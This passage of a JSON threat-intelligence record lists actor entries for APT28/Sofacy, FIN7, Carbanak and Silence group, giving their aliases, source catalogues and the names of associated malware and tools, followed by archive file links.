                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e8ebcbda-e8df-4a38-a2a6-63b2608ee6f3",
            "created_at": "2023-01-06T13:46:38.88051Z",
            "updated_at": "2025-03-27T02:00:02.94193Z",
            "deleted_at": null,
            "main_name": "Silence group",
            "aliases": [
                "WHISPER SPIDER"
            ],
            "source_name": "MISPGALAXY:Silence group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1566335725,
    "ts_modification_date": 1566371716,
    "files": {
        "pdf": "https://archive.orkl.eu/ab329ec81cc6bbc20a38b69ae91c1327a390ecd5.pdf",
        "text": "https://archive.orkl.eu/ab329ec81cc6bbc20a38b69ae91c1327a390ecd5.txt",
        "img": "https://archive.orkl.eu/ab329ec81cc6bbc20a38b69ae91c1327a390ecd5.jpg"
    }
}